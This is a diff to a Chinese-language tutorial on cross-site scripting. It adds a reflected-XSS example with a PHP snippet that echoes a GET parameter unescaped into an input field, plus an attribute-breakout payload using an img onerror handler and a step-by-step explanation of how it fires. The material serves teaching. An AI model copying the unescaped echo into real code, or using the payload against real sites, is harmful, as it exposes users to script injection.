@@ -42,4 +42,26 @@ XSS攻击分为三种：反射型、存储型、DOM型
 ```
 
 # 反射型XSS
-code/source/XSS/xss1.php
+## 示例
+code/source/XSS/xss1.php  
+关键代码：
+```php
+<?php
+		if (isset($_GET['xss_input_value'])) {
+			echo '<input type="text" value="'.$_GET['xss_input_value'].'">';
+		}else{
+			echo '<input type="text" value="输出">';
+		}
+	?>
+```
+构造payload
+```
+xss_input_value="><img src=1 onerror=alert(xss)/>
+```
+## 分析
+payload发生步骤
+- 通过GET传参xss_input_value值
+- 拼接成`<input type="text" value=""><img src=1 onerror=alert(xss)/>">`
+- echo输出img标签 触发xss
+
+## 存储型xss攻击
